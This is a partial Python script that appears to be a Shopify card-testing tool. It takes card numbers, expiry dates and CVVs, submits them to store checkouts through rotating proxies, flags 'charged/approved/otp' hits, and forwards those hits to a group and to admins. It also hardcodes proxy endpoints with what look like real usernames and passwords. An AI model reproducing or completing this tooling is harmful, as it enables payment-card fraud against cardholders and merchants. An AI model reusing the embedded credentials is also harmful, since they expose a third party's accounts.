...
# Use rotating endpoint (single URL, auto-rotates IP per request)
ROTATING_PROXY = "http://brd-customer-hl_54dda161-zone-isp_proxy1-ip-91.108.200.153:sxf92a7e5g32@brd.superproxy.io:44445"

# OR a pool if you have static list
PROXY_POOL = cycle([
    # "http://user:pass@ip:port
    6920:Ad7rkrwqOpuW@p104.instantproxies.com:9543
6920:Ad7rkrwqOpuW@p105.instantproxies.com:9542
6920:Ad7rkrwqOpuW@p104.instantproxies.com:9543
6920:Ad7rkrwqOpuW@p105.instantproxies.com:9542
6921:i6AqMWsp3bm4@p104.instantproxies.com:9544
6921:i6AqMWsp3bm4@p105.instantproxies.com:9543
brd-customer-hl_54dda161-zone-isp_proxy1:sxf92a7e5g32@brd.superproxy.io:33335
210211:9SaZsuX28q9N@38.154.151.101:8800
brd-customer-hl_54dda161-zone-isp_proxy1-ip-91.108.200.153:sxf92a7e5g32@brd.superproxy.io:44445
brd-customer-hl_54dda161-zone-isp_proxy1-ip-158.46.206.171:sxf92a7e5g32@brd.superproxy.io:44445
brd-customer-hl_54dda161-zone-isp_proxy1-ip-185.81.173.183:sxf92a7e5g32@brd.superproxy.io:44445
brd-customer-hl_54dda161-zone-isp_proxy1-ip-203.166.132.201:sxf92a7e5g32@brd.superproxy.io:44445
brd-customer-hl_54dda161-zone-isp_proxy1-ip-31.204.21.80:sxf92a7e5g32@brd.superproxy.io:44445
brd-customer-hl_54dda161-zone-isp_proxy1-ip-185.81.187.242:sxf92a7e5g32@brd.superproxy.io:44445
brd-customer-hl_54dda161-zone-isp_proxy1-ip-168.158.137.192:sxf92a7e5g32@brd.superproxy.io:44445
brd-customer-hl_54dda161-zone-isp_proxy1-ip-85.28.36.29:sxf92a7e5g32@brd.superproxy.io:44445
brd-customer-hl_54dda161-zone-isp_proxy1-ip-158.46.158.79:sxf92a7e5g32@brd.superproxy.io:44445
6701:FIvsyqXa7R0O@p101.instantproxies.com:9595
6701:FIvsyqXa7R0O@p103.instantproxies.com:9594
])
...
def get_proxy():
    try:
        ...
        return ROTATING_PROXY if ROTATING_PROXY else None
...
async def check_proxy_alive(proxy_url, timeout_secs=8):
    """Quick connectivity check. Returns True if proxy works."""
    if not proxy_url:
        return False
    try:
        timeout = aiohttp.ClientTimeout(total=timeout_secs)
        async with aiohttp.ClientSession(timeout=timeout) as sess:
            async with sess.get("https://api.ipify.org?format=json", proxy=proxy_url, ssl=False) as r:
                return r.status == 200
    except Exception:
        return False
...
async def send_hit_async(cc_string, site, gateway, price, currency, response_msg):
    """Forward approved/charged hits to the group."""
...
async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=None):
    ...
    try:
        ...
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            ...
            # Build ID / Source Token / Ident Sig
            ...
            try:
                ...
                return False, f"Invalid JSON submit response", gateway, total_price, currency
            except Exception as e:
...
def shopify_checker():
    try:
        ...
        # Determine if it's a hit (charged/approved/otp)
        hit_keywords = [
        ...
        # Send hit to group if charged/approved/otp
        if is_hit:
            try:
                loop = asyncio.new_event_loop()
                asyncio.set_event_loop(loop)
        ...
        # Always send private log to admins
        try:
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            try:
